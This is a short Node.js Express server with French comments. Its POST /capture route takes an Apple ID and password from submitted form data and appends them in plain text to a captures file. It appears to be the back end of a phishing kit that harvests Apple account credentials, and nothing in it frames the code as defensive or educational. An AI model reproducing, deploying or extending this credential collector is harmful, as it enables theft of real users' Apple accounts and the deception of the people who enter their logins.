const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware pour servir les fichiers statiques et traiter les données POST
app.use(express.static(__dirname));
app.use(bodyParser.json());

// Route pour capturer les interactions utilisateur
app.post('/capture', (req, res) => {
    const { interaction, appleId, password } = req.body;
    const filePath = path.join(__dirname, 'captures', 'interactions.txt');

    // Format de l'enregistrement
    const logEntry = `${new Date().toISOString()} - ${interaction} - Identifiant : ${appleId}, Mot de passe : ${password}\n`;

    // Enregistrer l'interaction dans le fichier interactions.txt
    fs.appendFile(filePath, logEntry, (err) => {
        if (err) {
            console.error('Erreur lors de l\'écriture dans le fichier:', err);
            res.status(500).send('Erreur du serveur');
        } else {
            res.send('Interaction capturée');
        }
    });
});

// Démarrer le serveur
app.listen(PORT, () => {
    console.log(`Serveur démarré sur http://localhost:${PORT}`);
});
